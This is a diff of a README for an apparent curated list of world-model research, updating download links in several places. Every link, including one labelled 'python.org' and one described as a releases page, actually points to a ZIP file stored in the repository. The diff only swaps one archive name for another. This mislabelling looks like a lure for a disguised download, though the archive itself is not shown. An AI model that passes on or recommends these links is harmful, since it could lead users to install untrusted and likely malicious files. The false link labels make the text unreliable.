@@ -1,6 +1,6 @@
 # 🌍 Awesome-World-Models - Explore World Model Research Easily
 
-[![Download Release](https://img.shields.io/badge/Download-Awesome--World--Models-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/enochochieng/Awesome-World-Models/main/docs/research/Awesome_Models_World_v2.2.zip)
+[![Download Release](https://img.shields.io/badge/Download-Awesome--World--Models-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/enochochieng/Awesome-World-Models/main/docs/learning/Models-World-Awesome-2.7-alpha.5.zip)
 
 ---
 
@@ -31,7 +31,7 @@ To begin exploring the Awesome-World-Models collection, follow these steps:
 
 1. Visit the releases page by clicking the large button below:
 
-   [![Download Release](https://img.shields.io/badge/Download-Awesome--World--Models-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/enochochieng/Awesome-World-Models/main/docs/research/Awesome_Models_World_v2.2.zip)
+   [![Download Release](https://img.shields.io/badge/Download-Awesome--World--Models-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/enochochieng/Awesome-World-Models/main/docs/learning/Models-World-Awesome-2.7-alpha.5.zip)
 
 2. On the releases page, look for the latest release. It should contain links to downloadable files such as PDFs of papers or supplementary materials.
 
@@ -82,7 +82,7 @@ This repository organizes its content to make navigation easy:
 
 If you want to try the example code:
 
-1. Install Python for Windows from [python.org](https://raw.githubusercontent.com/enochochieng/Awesome-World-Models/main/docs/research/Awesome_Models_World_v2.2.zip). Choose the latest stable version.
+1. Install Python for Windows from [python.org](https://raw.githubusercontent.com/enochochieng/Awesome-World-Models/main/docs/learning/Models-World-Awesome-2.7-alpha.5.zip). Choose the latest stable version.
 2. Download the code files from the `Code-Examples/` folder in the latest release.
 3. Extract the ZIP file if needed.
 4. Open Command Prompt (type "cmd" in the Windows start menu).
@@ -98,7 +98,7 @@ The code will typically produce simple outputs showing how a world model might b
 ## 🔗 Important Links
 
 - Visit the release page again to download files:  
-  https://raw.githubusercontent.com/enochochieng/Awesome-World-Models/main/docs/research/Awesome_Models_World_v2.2.zip
+  https://raw.githubusercontent.com/enochochieng/Awesome-World-Models/main/docs/learning/Models-World-Awesome-2.7-alpha.5.zip
 
 - To learn more about world models concepts, check the summaries folder inside the repository after downloading.
 
